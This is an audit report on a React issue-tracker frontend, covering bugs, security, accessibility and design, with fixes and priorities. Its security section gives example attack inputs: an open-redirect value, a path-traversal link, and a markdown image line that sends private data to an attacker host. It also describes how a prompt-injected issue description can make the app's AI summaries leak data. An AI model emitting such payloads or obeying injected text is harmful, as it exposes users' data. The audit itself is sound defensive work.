# TrackForge UI — Release-Readiness Audit

**Scope:** `apps/frontend` only (React 18 + Vite + Tailwind + TanStack Query). Backend, MCP and specs were not read.
**Method:** static code review. The app was **not run**; nothing here was confirmed in a browser.
**Date:** 2026-11-10

## How to read this

- **Severity** — `P0` fix before the customer sees it · `P1` fix before calling it "finished" · `P2` polish needed for a top-tier product · `P3` nice to have.
- **Confidence** — `Confirmed` means the defect is visible in the code as written. `Likely` means the code strongly suggests it but it depends on runtime or backend behaviour. `Verify` means the UI exposes a path whose safety is decided by the backend.
- Line numbers refer to the files as they were on the audit date.

### Coverage (what was and was not read)

| Read in full | Read partially / pattern-searched only |
|---|---|
| `main.tsx`, `App.tsx`, `index.css`, `index.html`, `tailwind.config.js`, `vite.config.ts`, `package.json`, `i18n.ts`, `locales/en.ts` | `api/client.ts` (first 680 of 2,942 lines + targeted searches) |
| `api/events.ts`, `lib/{url,optimistic,format,pageTitle}.ts`, `hooks/{usePermissions,useGlobalShortcuts}.ts` | `IssueSearchView.tsx` (1,335), `BacklogPage.tsx` (1,608), `IssueTable.tsx`, `BulkWizard.tsx` |
| `LoginPage`, `InviteAcceptPage`, `ProfilePage`, `YourWorkPage`, `ProjectsPage`, `BoardPage` (to line 887), `IssueDetailPage`, `AdminTokensPage`, `AiSettingsPage`, `WebhooksPage` | `ReportsPage`, `RoadmapPage`, `DashboardsPage`, `ReleasesPage`, `ComponentsPage`, `FiltersPage`, `ApprovalsPage`, `AutomationPage` |
| `TopNav`, `ProjectSidebar`, `AdminLayout`, `ProjectLayout`, `RequireAuth`, `RequireAdmin`, `Modal`, `ConfirmDialog`, `Flag`, `SelectMenu`, `RowMenu`, `InlineEdit`, `EmptyState`, `Markdown`, `CommandPalette`, `CreateIssueDialog`, `CreateProjectDialog`, `IssueDetailView`, `IssueDrawer`, `ActivitySection`, `AttachmentsPanel`, `BoardCard`, `DevelopmentPanel`, `UserAvatar`, `HelpLink`, `ShortcutsHelp`, `docs/DocView` | All other admin pages (`AdminUsers`, `AdminGroups`, `AdminSchemes`, `AdminScreens`, `AdminFieldConfig`, `AdminIdentity`, `AdminMail`, …), `WorkflowEditorPage`, `MigrationPage`, `BoardSettingsPage`, `ProjectSettingsPage`, `CustomFieldsPage`, `SystemPage`, remaining pickers/panels |

Roughly half of the ~40k lines were read line by line. **The partially-read files almost certainly contain more issues of the same kinds listed below** — treat the systemic findings (sections 4–7) as applying to them too.

---

## 1. Verdict

The UI is feature-rich and shows real care in places (optimistic updates with rollback, keyboard drag-and-drop on the board, focus-trapped modals, a `ConfirmDialog`, sanitised Markdown, a safe-href allow-list, an "updated elsewhere" banner, rate-limit handling on auth). It is **not yet a finished customer product**. The gaps are:

1. A handful of **real functional bugs** a customer will hit in the first hour (section 2).
2. **Security items** that need a decision or a backend check before shipping (section 3).
3. **No resilience layer**: no error boundary, no 404 page, several screens that hang on "Loading…" forever when a request fails (section 4).
4. **Desktop-only, English-only, light-only**: ~37 responsive classes in the whole app, ~40 translated strings, no dark mode outside `/docs` (sections 5–6).
5. **No design system**: every button, input and dialog is a hand-written class string, so colours, radii, sizes and hover directions drift from page to page (section 7).

Suggested order of work is in section 9.

---

## 2. Functional bugs

### B-01 · `g` then `i` on an issue page silently assigns the issue to you — P0 · Confirmed
`useGlobalShortcuts.ts:26-31` handles the chord `g i` (go to issue navigator). `IssueDetailView.tsx:916-943` registers its **own** `document` keydown listener where a bare `i` means "assign to me" and calls `assignIssue` immediately. The second listener has no knowledge of the pending chord, so `g i` both navigates away **and** reassigns the issue. There is no confirmation, no toast and no undo, so the user will not notice.
The same listener also fires `e` / `a` / `m` / `i` while a modal is open (focus on a button is not an "editable" target) and for every `IssueDetailView` mounted (drawer + page).
**Fix:** move issue shortcuts into the global hook (one listener, one chord state), ignore keys while any `[role="dialog"]` is open, and show a flag with Undo after assign-to-me.

### B-02 · Board settings page shows the *project* settings sidebar — P1 · Confirmed
`ProjectLayout.tsx:14` uses `pathname.endsWith('/settings')` to swap in `ProjectSettingsSidebar`. The route `/projects/:key/board/settings` (`App.tsx:154`) also ends in `/settings`, so Board settings renders the Details / People / Schemes / Danger zone nav, whose buttons then write `?section=` onto the board-settings URL (`ProjectSidebar.tsx:322`).
**Fix:** match the exact route (`useMatch('/projects/:projectKey/settings')`).

### B-03 · German (and every non-English locale) can never activate from the profile UI — P1 · Confirmed
`ProfilePage.tsx:31` offers locales with hyphens (`de-DE`). `i18n.ts:25` splits on underscore (`split('_')`), so `de-DE` stays `de-DE`, no resource bundle matches, and the language stays English. The select also offers `es-ES`, `fr-FR`, `it-IT`, `ja-JP`, `pt-BR`, for which no catalog exists at all.
**Fix:** split on `/[-_]/`; only list locales that have a catalog.

### B-04 · Deliveries dialog is wider than the modal that contains it — P1 · Confirmed
`Modal.tsx:67` hard-codes `max-w-[560px]`. `WebhooksPage.tsx:109` puts a `w-[720px]` table inside it, so the delivery log scrolls sideways inside a 560px box. The attachment lightbox (`AttachmentsPanel.tsx:247`) has the same constraint: full-size images are previewed at ≤560px.
**Fix:** give `Modal` a `size` prop (`sm | md | lg | xl | full`).

### B-05 · Screens hang on "Loading…" forever when the request fails — P1 · Confirmed
`YourWorkPage.tsx:60` (`isLoading || !data`), `ProfilePage.tsx:58`, `AdminMailPage.tsx:51`, `ProjectSummaryPage.tsx:96` never check `isError`. Because the default `QueryClient` (`main.tsx:8`) retries three times with back-off, the user first waits several seconds, then stares at "Loading…" with no retry. `YourWorkPage` is the **home page**.
**Fix:** shared `<QueryBoundary>` (loading skeleton / error with Retry / empty) and use it everywhere.

### B-06 · Unknown URLs render a blank page — P1 · Confirmed
`App.tsx:109-174` has no catch-all route. `/foo`, `/projects/X/typo`, `/admin/typo` show the top nav and nothing else. `RequireAdmin` has a private 404 but nothing reuses it.
**Fix:** add `<Route path="*" element={<NotFound />} />` at both the shell and project levels.

### B-07 · One render error white-screens the whole app — P1 · Confirmed
No `ErrorBoundary` anywhere (searched). Several components dereference API data without guards, e.g. `f.priority.name` in `BoardCard.tsx:124`, `fields.status.statusCategory.key` in `IssueDetailView.tsx:1106`. One malformed issue takes down the entire board.
**Fix:** error boundary per route + one around each board card / table row.

### B-08 · Timeline page title is "Project" — P2 · Confirmed
`pageTitle.ts:12` maps `roadmap`, but the live route is `timeline` (`App.tsx:157`).

### B-09 · Viewing an issue highlights "Summary" in the sidebar — P2 · Confirmed
`IssueDetailPage.tsx:24` passes `activeItem="list"`; in `ProjectSidebar.tsx:237-243` that flag is wired to the **Summary** item, not **List**.

### B-10 · Several colour classes do not exist, so the styling silently vanishes — P1 · Confirmed
`tailwind.config.js` defines no `y-100`, `y-400`, `y-600`, `g-100`, `g-600`, `b-600`. Tailwind emits nothing for unknown tokens:

| Where | Class | Effect |
|---|---|---|
| `TopNav.tsx:779` | `bg-atl-y-100` | **Site-wide announcement banner has no background** |
| `TopNav.tsx:143`, `:502` | `text-atl-y-400` | Starred-filter stars are not yellow |
| `LoginPage.tsx:186`, `CommandPalette.tsx:428` | `text-atl-y-600` | Warning text falls back to inherited colour |
| `CommandPalette.tsx:336` | `text-atl-g-600` | Success notice text not green |
| `ActivitySection.tsx:265` | `bg-atl-g-100` | "BILLABLE" chip has no background |
| `HelpLink.tsx:33` | `hover:text-atl-b-600` | No hover colour |

More hits in `ApprovalsPage:50`, `IssueSearchView:813,1020`, `RoadmapPage:290`, `DiffView:13`, `BulkWizard:204,236`, `AutomationPage:109`, `FiltersPage:30`, `AgentSessionsPanel:74`, `ReleasesPage:336`. My search covered only some shade numbers; do a full sweep.
**Fix:** add the missing shades or replace them, then add a lint rule (`eslint-plugin-tailwindcss` `no-custom-classname`) so this cannot recur.

### B-11 · `?invited=1` is never read — P2 · Confirmed
`InviteAcceptPage.tsx:25` navigates to `/login?invited=1`; `LoginPage` ignores it. A newly-activated user lands on a bare login form with no "account activated" confirmation.

### B-12 · Destructive actions with no confirmation — P1 · Confirmed
- Delete attachment: `AttachmentsPanel.tsx:193`, `:234` — one click on a small `×`, failures are silent (`remove` has no `onError`).
- Remove issue link / web link: `LinkedIssuesPanel.tsx:219`, `:253`.
- Revoke session / revoke OAuth grant: `ProfilePage.tsx:149`, `:165`.
The app already has `ConfirmDialog`; these just do not use it.

### B-13 · Unhandled promise rejections give the user no feedback — P1 · Confirmed
`ProfilePage.tsx:87, 112, 116, 126, 149, 166` call the API inside `async` click handlers with no `try/catch`. A wrong 2FA code, an expired session or a network error produces **nothing on screen**. `ProfilePage.tsx:55-56` shows errors as `String(e)` ("Error: …") in the same blue as success messages.

### B-14 · Create-issue dialog — P1/P2
- **Form can be wiped mid-typing** (Likely, P1). The reset effect at `CreateIssueDialog.tsx:113-131` depends on `projects`. Any refetch that returns changed project data (window refocus, SSE invalidation, or the dialog's own `invalidateQueries(['projects'])` after "Create another") re-runs it and clears every field including the "Created TF-1, TF-2" list.
- **Issue types are global, not per project** (Likely, P1). It calls `fetchIssueTypes()`; the `Project.issueTypes` scheme-scoped list (`client.ts:17`) is ignored, so users can pick a type the project rejects. Defaults `'Task'` / `'Medium'` are hard-coded and may not exist.
- **Only the first server error is shown** (Confirmed, P2). `error.message` at `:199`; the per-field `errors` map the API returns is never placed next to the fields.
- **Required custom fields are not validated client-side** (Confirmed, P2).
- **Clicking the backdrop or pressing Esc discards everything with no warning** (Confirmed, P1) — see U-03.
- No story points, sprint or attachment at create time (P2).

### B-15 · Board drop fires transition and rank as two unordered requests — P2 · Likely
`BoardPage.tsx:346-351`, `:762-768`, `:793-799` call `transitionMutation.mutate` then `rankMutation.mutate` back-to-back. If the transition fails, the rank still applies; both then `invalidateQueries`, which can flicker the card. Chain the rank in the transition's `onSuccess`.

### B-16 · Switching board drops every other query parameter — P3 · Confirmed
`BoardPage.tsx:398`, `:833` use `setSearchParams({ board })`, discarding `selectedIssue` and anything else.

### B-17 · Command palette — P2 · Confirmed
- Project/issue context needs an upper-case URL (`CommandPalette.tsx:168-169`); `/projects/tf/board` yields no context while `TopNav.tsx:193` is case-insensitive.
- "Review approvals" (`:483`) navigates but leaves the palette open on top.
- After any Copilot apply it calls `qc.invalidateQueries()` with no key (`:216`) — refetches every query in the app.

### B-18 · Notifications — P2 · Confirmed
`TopNav.tsx:579-583`: opening an item marks it read but never invalidates the list, so the badge is stale for up to 30s. Notifications without an `issueKey` do nothing when clicked. Only the first 25 are shown with no "see all".

### B-19 · Sign-out pretends to succeed when it failed — P2 · Confirmed
`TopNav.tsx:699-703`: `logout().catch(() => undefined)` then navigate to `/login`. If the request failed the session cookie is still valid. See also S-08.

### B-20 · Dates ignore the user's own preferences — P2 · Confirmed
`format.ts:1-17` hard-codes `en-US`. There are 35 further raw `toLocale*String()` calls (e.g. `TopNav.tsx:638`, `AttachmentsPanel.tsx:187`, `YourWorkPage.tsx:165`, `AdminTokensPage.tsx:11`). The profile's date-format and timezone settings therefore apply on some screens and not others. Relative times ("5m ago") never tick.

---

## 3. Security

Most of these are hardening items; three need an answer before release.

### S-01 · Password-reset token can be handed straight to the browser — P0 · Verify (backend)
`LoginPage.tsx:140-141` and `:185-189`: if `requestPasswordReset(email)` returns a token, the UI pre-fills it and lets the visitor set a new password. The copy says this happens when "email delivery isn't configured on this server". If a customer deploys without SMTP — common for self-hosted — **anyone who knows an email address can take over that account, including the admin's**.
**Action:** confirm the backend only does this under an explicit dev flag that is off in production builds. Ideally remove the code path from the production bundle entirely.

### S-02 · Post-login redirect accepts `//host` — P1 · Likely
`LoginPage.tsx:42-43` and `:225-226` accept any `next` that `startsWith('/')`. `//evil.example` and `/\evil.example` pass. Depending on how the router resolves a protocol-relative path, this is an open redirect usable for phishing ("log in to TrackForge" → attacker page).
**Fix:** `const safe = /^\/(?![/\\])/.test(next) ? next : '/'`.

### S-03 · Reset token stays in the address bar — P2 · Confirmed
`/login?resetToken=…` (`LoginPage.tsx:29-32`) is read but never stripped, so it remains in browser history and in any screen-share. Replace the URL (`navigate('/login', { replace: true })`) after reading.

### S-04 · Rendered Markdown can load remote images — P1 · Confirmed
`Markdown.tsx:18-21` sanitises well against script injection, but `<img src="https://anywhere/…">` is allowed. Consequences:
- Any user who can comment can plant a tracking pixel that reports the IP and view time of everyone who opens the issue.
- **AI output is rendered through the same component** (`CommandPalette.tsx:81`, `:411`; `IssueDetailView.tsx:494`). A prompt-injected issue description can make the model emit `![x](https://attacker/?d=<private data>)`, exfiltrating data the moment the summary renders. This is the standard LLM-markdown exfiltration channel.
- Links have no `rel="noopener noreferrer"` and open in the same tab.
**Fix:** DOMPurify `afterSanitizeAttributes` hook — allow `img[src]` only for same-origin `/rest/…/attachment/…` paths (or proxy), add `rel`/`target` to anchors. `FORBID_ATTR: ['style','onerror','onclick']` is redundant (DOMPurify already strips handlers) and gives a false sense of being the control.

### S-05 · Docs HTML is injected unsanitised — P2 · Verify
`DocView.tsx:124` sets `d.html` from the server via `dangerouslySetInnerHTML` with no DOMPurify pass. Safe only while docs content is exclusively repo-authored. `/docs` is public, so run it through the same sanitiser as defence in depth.

### S-06 · Path parameters are interpolated into API URLs unencoded — P2 · Confirmed
`client.ts` encodes board IDs but not issue/project keys: `/issue/${key}` (`:346`, `:418`, `:428`, `:1183`, `:1208`, `:1212`), `/project/${key}` (`:334`, `:1835`), `/sprint/${id}`. Keys come from the URL (`/browse/:issueKey`, `/projects/:projectKey`, `?selectedIssue=`). A crafted link such as `/browse/..%2F..%2F…` makes the authenticated client call a different same-origin endpoint (client-side path traversal).
**Fix:** one `seg()` helper that `encodeURIComponent`s every path segment; additionally validate keys against `^[A-Z][A-Z0-9_]*(-\d+)?$` at the route boundary.

### S-07 · No CSRF token or custom header on state-changing requests — P1 · Verify (backend)
`client.ts:302-306` sends only cookies + `Content-Type: application/json`. Protection therefore rests on `SameSite` cookies and the backend rejecting non-JSON bodies. Attachment upload sends `X-Atlassian-Token: no-check` (`:1186`). Confirm the backend enforces SameSite=Lax/Strict **and** an Origin check; if not, add a double-submit token.

### S-08 · Personal data left in `localStorage` after logout — P1 · Confirmed
`tf.recentIssues` (issue keys **and summaries**) and `tf.recentProjects` (`TopNav.tsx:34-73`) persist after `signOut` and across accounts on a shared machine. The next person at that browser — even logged out — can read issue titles from dev-tools, and the next *logged-in* user sees the previous user's "Recent" list in the search box.
**Fix:** namespace by `accountId` and clear on logout.

### S-09 · Secrets handled through `window.prompt` and plain inputs — P2 · Confirmed
- Disable 2FA asks for the code via `prompt()` (`ProfilePage.tsx:115`).
- SCIM token name via `window.prompt` (`AdminIdentityPage.tsx:249`).
- Webhook secret is a plain text input (`WebhooksPage.tsx:64`).
- 2FA enrolment shows the raw `otpauth://` URL as text — **no QR code** (`ProfilePage.tsx:122`) — and backup codes have no copy/download and vanish on "Done".
- Change-password has no "confirm new password", no strength hint, no `autocomplete` attributes (`ProfilePage.tsx:105-106`), so password managers mis-file it.

### S-10 · Permission checks default to "allowed" until the server answers — P3 · Confirmed (by design)
`usePermissions.ts:24`: `can()` returns `true` while loading or if the permissions request fails. The server still enforces, so this is UX rather than a hole, but users see Edit/Delete controls that then fail. Comment edit/delete visibility is computed locally (`ActivitySection.tsx:131`) rather than from permissions.

### S-11 · No security metadata in the shell — P2 · Verify
`index.html` carries no CSP, no `referrer` policy, no `robots` directive. If these are not set as response headers by whatever serves the bundle, add them. A strict CSP (`img-src 'self' data:`) would also neutralise S-04 at the platform level.

### S-12 · Smaller items — P3
- OIDC link interpolates the IdP name unencoded: `LoginPage.tsx:251`.
- XML import reads the whole ZIP into memory as base64 with no size check (`MigrationPage.tsx:299-301`) — a large export will freeze the tab.
- A 401 on any request hard-redirects via `window.location.href` (`client.ts:309-312`), destroying any unsaved comment or form. Prefer an in-place "session expired — log in again" modal that preserves state.
- No requests are cancellable (no `AbortController` / `signal` anywhere); fast typing in search fires and races multiple queries.
- UI never sends `Idempotency-Key` on POST although the backend supports it — a double-submit or a retry after a timeout can create duplicates.

---

## 4. Resilience and feedback

| # | Finding | Sev | Evidence |
|---|---|---|---|
| R-01 | No error boundary (see B-07) | P1 | whole app |
| R-02 | No 404 route (see B-06) | P1 | `App.tsx` |
| R-03 | Default query retry (3× with back-off) applies to 403/404, so "not found" takes ~7s to appear, except where `retry:false` was remembered | P1 | `main.tsx:8` |
| R-04 | No global handler for failed mutations; each call site hand-rolls it or forgets (B-12, B-13) | P1 | — |
| R-05 | Three different feedback mechanisms in use: `useFlag` toasts, inline red text, and page-level `error` state that auto-hides after 5s (`BoardPage.tsx:144-147`) | P2 | — |
| R-06 | Toasts: `role="status"` even for errors (should be `alert`), no pause-on-hover, timers not cleared on unmount, bottom-left where they cover the collapsed sidebar | P2 | `Flag.tsx:52-67` |
| R-07 | No offline / reconnecting indicator. The SSE stream (`events.ts:84`) has no `onerror` handling or visible state; when it drops, the board silently stops being live | P1 | `events.ts` |
| R-08 | Issue load error shows "Something went wrong" for everything except 404 — including 403 (no permission) and network failure — with no Retry button | P2 | `IssueDetailView.tsx:972-988` |
| R-09 | Loading states are plain "Loading…" text on most pages; only the issue view and board have skeletons | P2 | many |
| R-10 | All 45+ pages are imported eagerly (only `/docs` is lazy) → one large initial bundle and slow first paint | P2 | `App.tsx:3-54` |
| R-11 | Three independent 30s polls (notifications, approvals, your-work) plus AI usage and a 5s webhook-delivery poll, none paused when the tab is hidden *and* SSE already pushes the same data | P3 | `TopNav.tsx:560,655`, `YourWorkPage.tsx:57` |
| R-12 | No unsaved-changes protection anywhere (no `beforeunload`, no router blocker). The only guard is a `window.confirm` for a comment draft in the drawer | P1 | `IssueDrawer.tsx:25` |
| R-13 | Test depth: 9 unit-test files and 13 Playwright specs for ~130 source files; the bugs in section 2 are not covered | P2 | `tests/` |

---

## 5. Usability gaps

### U-01 · Not usable on a phone or small tablet — P1
There are about **37 responsive utility classes in the entire codebase**.
- Global search is `hidden sm:block` with no mobile alternative (`TopNav.tsx:422`).
- The mobile menu lists five links and omits Create-project, Your work and Admin (`TopNav.tsx:798-804`).
- The project sidebar is a fixed 240px/56px column with no drawer mode (`ProjectSidebar.tsx:199-203`).
- The issue view is `grid-cols-[1fr_320px]` at every width (`IssueDetailView.tsx:1165`).
- The issue drawer is `min(760px, 60vw)` — about 225px on a phone (`IssueDrawer.tsx:87`).
- Notification panel is a fixed 380px (`TopNav.tsx:607`); profile uses a rigid `grid-cols-3`.
If mobile is out of scope, say so explicitly to the customer; otherwise this is the single largest piece of work.

### U-02 · Translation is a stub — P1
`locales/en.ts` holds ~40 keys (nav, shortcuts, profile). Only ~8 call sites use `t()`. Every other string in ~40k lines is hard-coded English, including all error and empty-state copy. Selling a "German" option that changes eleven labels will read as broken.

### U-03 · Modals lose work easily — P1
`Modal.tsx:57-59` closes on any backdrop mousedown and on Esc with no dirty check. This affects Create issue, Create project, webhook editor, workflow/screen editors. Also:
- Nested modals each register their own Esc listener — one keypress closes the whole stack.
- The focus-trap selector includes disabled buttons, so Tab can land on nothing.
- `ConfirmDialog` uses a fixed id `tf-confirm-title`; `ActivitySection` renders one `ConfirmDialog` **per comment and per worklog**, producing duplicate ids when two are open and many idle instances.
- Modal is top-anchored (`pt-16`) rather than centred; no enter/exit transition.

### U-04 · Dropdowns are not keyboard-operable — P1
The nav menus (Projects, Filters, Dashboards, user menu, notifications), `RowMenu`, `SelectMenu`, the issue Export menu and the global-search results have no arrow-key navigation, no `role="menu"`/`menuitem` (7 uses of those roles app-wide), no focus return on close. `RowMenu` and `DashboardsMenu` do not close on Esc. Global-search results cannot be reached with ↓.

### U-05 · Form labels are not connected to their fields — P1
Two `htmlFor` attributes in the whole app against ~95 standalone `<label>` elements (e.g. every field in `CreateIssueDialog`, `CreateProjectDialog`, `AiSettingsPage`). Clicking a label does nothing and screen readers announce unlabeled inputs. The login form has **no labels at all**, only placeholders (`LoginPage.tsx:72-90`), and its error is not `role="alert"`.

### U-06 · Other accessibility gaps — P2
- No skip-to-content link; no `prefers-reduced-motion` handling.
- Inputs use `outline-none` and signal focus only by a border-colour change (`CreateIssueDialog.tsx:26`, `LoginPage.tsx:80`).
- Icon-only buttons rely on `title` (Copilot button `TopNav.tsx:854-862`) or on glyphs: `×`, `✕`, `⋯`, `☰`, `↓`, `‹ ›`.
- Hover-only controls: edit pencils (`IssueDetailView.tsx:95`, `:192`) and card menus are `opacity-0 group-hover:opacity-100` — invisible on touch and to keyboard users without `focus-within`.
- The attachment drop-zone is a clickable `<div>` (`AttachmentsPanel.tsx:107-127`), not focusable.
- Activity tabs lack `role="tablist"` (Your work has it — inconsistent).
- Command palette has no `role="dialog"`, `aria-modal` or focus trap (`CommandPalette.tsx:298-302`).
- Status is conveyed by colour alone in several chips.
- An axe gate exists (`tests/e2e/a11y.spec.js`) — extend it to open dialogs, menus and the drawer.

### U-07 · Login / onboarding — P2
- The reset form appears *below* the still-visible login form; the TOTP form likewise. Three stacked forms sharing one `busy`/`error` state.
- No show-password toggle; reset "new password" has no confirm field and no `autocomplete="new-password"`; TOTP lacks `autocomplete="one-time-code"`.
- Non-dev reset flow asks the user to "paste the token" rather than just following the emailed link.
- No first-run experience: an empty instance drops the admin on an empty "Your work" with no guidance to create a project, invite people or load sample data.
- No "what's new", product tour, or contextual hints beyond the `?` link.

### U-08 · Profile — P2
No way to change display name or email, no avatar upload, **no personal API-token management** (tokens exist only on the admin page, which lists and revokes but does not create), no notification preferences. The timezone select is a raw list of ~400 IANA names with no search. Sessions show raw IPs with no "sign out everywhere".

### U-09 · Issue view — P2
- Clicking the rendered description enters edit mode (`IssueDetailView.tsx:1316-1327`), so users cannot click a link or select text inside a description without opening the editor.
- Change history is not paginated and not collapsed; long-lived issues render every entry.
- Mentions resolve only against the first page of assignable users (`ActivitySection.tsx:391-396`); others display as raw `[~accountId:…]`.
- Markdown editor: mention picker is a toolbar button, not triggered by typing `@`; no numbered list, heading, quote, table or task-list buttons; no drag-and-drop file, only paste; no autosave of drafts; description `Save` is disabled when empty so a description cannot be cleared from the editor (`Markdown.tsx:242`).
- "Copy to clipboard" (`IssueDetailView.tsx:513`) gives no confirmation and silently fails on plain HTTP — `DocView.tsx:17-38` already has a working fallback that should be shared.
- No copy-link / copy-key button, no "next / previous issue" navigation on the full page.
- Watchers shows a count only — no list, no add-other-watcher.
- Story points accepts negatives and decimals of any precision.

### U-10 · Board — P2
- Breadcrumb is plain text, not links (`BoardPage.tsx:367-374`).
- Assignee filter shows the first 8 avatars and silently hides the rest (`:477`); no "unassigned" filter.
- Search, assignee filter, group-by and quick filters are local state — lost on refresh and not shareable by URL.
- Column headers do not stick; with swimlanes the column names scroll away.
- No quick-add card at the bottom of a column; no empty-column hint; no WIP-limit explanation beyond colour.
- Up to 2,000 issues are fetched and rendered without virtualisation (`client.ts:594`).

### U-11 · Navigation and wayfinding — P2
- No consistent breadcrumb component; some pages have links, some text, most none.
- "Project settings" appears in the Projects row menu for users who cannot administer (`ProjectsPage.tsx:212`).
- Sidebar always says "Software project" (`ProjectSidebar.tsx:215`); Reports is hidden for Kanban boards.
- People directory is reachable only under Admin although `/teams` exists for everyone.
- Shortcuts dialog is a narrow modal with a single column; shortcuts are not shown next to the actions they trigger.
- Emoji literals double as icons in the UI (`🔗` in the editor toolbar).

### U-12 · Missing product-level capabilities a customer will ask about — P2/P3
Dark mode in the app (exists only for `/docs`); density toggle; saved table column widths; bulk-edit affordance on the board; undo for destructive or bulk actions; in-app notification preferences; print styles; PWA manifest / touch icons (`public/` holds only `favicon.svg`); `<meta name="description">` and `theme-color`; customer branding (logo, product name and accent colour are hard-coded in `TopNav.tsx:818-826`, `LoginPage.tsx:57-65`).

---

## 6. Performance notes

- **Bundle:** eager imports of every page (R-10). Route-level `lazy()` for admin, reports, workflow editor, migration and dashboards is the cheap win.
- **Over-fetching:** `GlobalSearch` loads all projects on every page for every user (`TopNav.tsx:388`); `ActivitySection` loads all assignable users per issue view; every SSE event queues invalidation of `issues`, `board-issues`, `notifications` and `mywork` (`events.ts:102-105`).
- **Re-renders:** `BoardPage` recomputes filters, lanes and columns on every render with no memoisation, and every card receives fresh inline closures, so dragging re-renders the whole board on each `dragover` state change.
- **Lists:** no virtualisation on board, backlog (1,608-line page) or issue table.
- **Query defaults:** `staleTime` 0 + refetch-on-focus means alt-tabbing refetches every mounted query. Set a sensible global `staleTime` (e.g. 30s) since SSE already drives freshness.

---

## 7. Visual design — what separates this from a top-tier product

The app mimics Jira Server's look competently. To reach a polished, *own-brand* standard:

### D-01 · There is no component library — P1
Buttons, inputs, selects, badges, tables, tabs and cards are re-typed as class strings on each page. Measured drift:

| Element | Variants found |
|---|---|
| Primary button | `bg-atl-b-300 hover:b-400` (Login, Markdown, AI settings) · `bg-atl-b-400 hover:b-500` (Create dialogs, Projects) · `bg-atl-b-400 hover:b-300` — **gets lighter on hover** (Webhooks) |
| Danger button | `bg-atl-r-400 hover:r-300` (ConfirmDialog) · `bg-atl-r-300 hover:r-400` (Webhooks) · `bg-atl-r-400 hover:r-500` (Tokens) |
| Height | `h-7`, `h-8`, `h-9`, `h-10`, and `py-1` / `py-1.5` / `py-2` |
| Radius | `rounded`, `rounded-[3px]`, `rounded-md`, `rounded-lg`, `rounded-[10px]`, `rounded-full` |
| Input border | `border` vs `border-2`; `border-atl-n-30` vs `-40`; bare `border` with default colour (Profile) |
| Font sizes | Tailwind scale mixed with `text-[10px]`, `[11px]`, `[12px]`, `[13px]`, `[14px]`, `[15px]`, `[17px]`, `[18px]`, `[24px]` |
| Page padding / width | `p-6`, `p-8`, `px-8 py-8`, `px-6 pt-5`; `max-w-3xl`, `5xl`, `6xl`, `[1000px]`, `[1100px]`, or none |
| Page background | white, `atl-n-10`, `atl-n-20` |
| Table headers | Title Case with `uppercase` class vs literal "NAME" / "URL" in source |

**Fix:** build ~12 primitives (`Button`, `IconButton`, `Input`, `Select`, `Textarea`, `Checkbox`, `Field`, `Badge`, `Table`, `Tabs`, `Menu`, `Dialog`, `Page`/`PageHeader`) and migrate page by page. `PageHeader.tsx` and `EmptyState.tsx` exist but are used by only a few pages. Consider Radix or Headless UI for Menu/Dialog/Select to get keyboard and ARIA behaviour (U-04, U-03) for free.

### D-02 · Design tokens are raw palette, not semantic — P1
Colours are referenced as `atl-n-200`, `atl-b-300`. There is no `text-muted`, `surface`, `border`, `accent`, `danger`. Consequences: dark mode and customer theming are impossible without touching every file; the WCAG fix in `index.css:38` works by globally overriding two utility classes, which is surprising and fragile; 109 inline `style={{…}}` blocks bypass the system (notably `SystemPage`). The `/docs` portal already demonstrates the right approach with `--d-*` CSS variables — extend that to the whole app.

### D-03 · Avatars are random emoji — P1
`UserAvatar.tsx` assigns each person one of 40 emoji by name hash (🦊 🐼 🍩 🔥 …). This reads as playful prototype, not enterprise tooling; emoji render differently on Windows, macOS and Linux; with 40 glyphs, collisions start at a handful of users; and screen readers get the name while sighted users get a doughnut. **Use initials on a coloured disc, with optional uploaded photo.**

### D-04 · Icons are inconsistent — P2
`icons.tsx` exists, yet dozens of components embed raw `<svg>` paths (the same magnifier path is pasted in at least four files), and Unicode glyphs stand in for icons elsewhere. Stroke widths vary (1.4, 1.5, 1.6, 1.8). Adopt one icon set at one stroke weight and one size scale.

### D-05 · Typography and density — P2
Body text sits at 12–14px with 10–11px metadata throughout; uppercase 10–11px section labels are heavily used. It is dense in the Jira-Server tradition but tiring. Define a type scale (e.g. 12 / 13 / 14 / 16 / 20 / 24), a minimum of 12px for anything readable, consistent line heights, and tabular numerals for counts and dates.

### D-06 · Motion and micro-interaction — P2
Almost none: menus, modals, drawer and toasts appear and disappear instantly; the drawer is called a "slide-over" but does not slide. Add 120–180ms transitions for overlays, a drag "lift" shadow and placeholder on the board, button pressed states, and honour `prefers-reduced-motion`.

### D-07 · Empty, loading and success states — P2
`EmptyState` uses the same magnifier for everything. Top-tier products use purposeful illustrations plus a primary action per empty state, skeletons that match final layout, and success confirmation (toast with Undo) for every mutation.

### D-08 · Layout chrome — P2
- Two competing sidebars patterns (project: collapsible with icons; admin: fixed, no icons, 22 flat links). Admin nav needs icons, grouping that collapses, and a search.
- Top bar on wide screens leaves search at a fixed 176px (`w-44`); a centred, expanding search is the modern expectation, and Cmd+K should be discoverable *in* the search field.
- Flags bottom-left collide with the sidebar collapse control; top-right or bottom-centre is safer.
- Issue view: three stacked bordered boxes on the right plus a bordered Details box on the left produce a lot of line noise; consider borderless sections with dividers.

### D-09 · Brand — P2
Palette, lozenges and layout are Atlassian's. For a product sold under its own name that is a perception risk (and a mild trademark-look one). A distinct accent colour, logo treatment, and login-page identity would cost little once D-02 is done.

---

## 8. Code-health observations that affect the UI

- `api/client.ts` is 2,942 lines of hand-written types and fetch wrappers; AGENTS.md already flags the drift risk. Until codegen lands, at least route every call through one `path()` encoder (S-06) and one error type.
- Cross-component communication via `window.dispatchEvent('tf:…')` + `document.querySelector('[data-tf-…]')` (`IssueDetailView.tsx:905-909`, `:925-928`). It works, but with a drawer and a page mounted together the selector hits the first match in the DOM, not necessarily the intended one.
- Many `document.addEventListener('keydown'…)` listeners live in parallel (app shell, shortcuts hook, each menu, modal, drawer, palette, issue view, board). B-01 is a direct result. Centralise into one keyboard manager with a scope stack.
- Mixed indentation / unformatted regions (`App.tsx:129-134`, `BoardPage.tsx:11`, `:66-68`) suggest Prettier is not enforced on commit.

---

## 9. Recommended order of work

**Before the customer sees it (P0 + the P1s that are embarrassing):**
1. S-01 — confirm reset-token behaviour in production.
2. B-01 — shortcut that reassigns issues.
3. B-10 — missing colour classes (announcement banner).
4. B-05, B-06, B-07 — error boundary, 404, query error states.
5. S-02, S-04, S-08 — redirect check, image allow-list, clear local data on logout.
6. B-02, B-03, B-04, B-12, B-13 — sidebar clash, locale, modal width, confirmations, silent failures.

**Before calling it finished (remaining P1):**
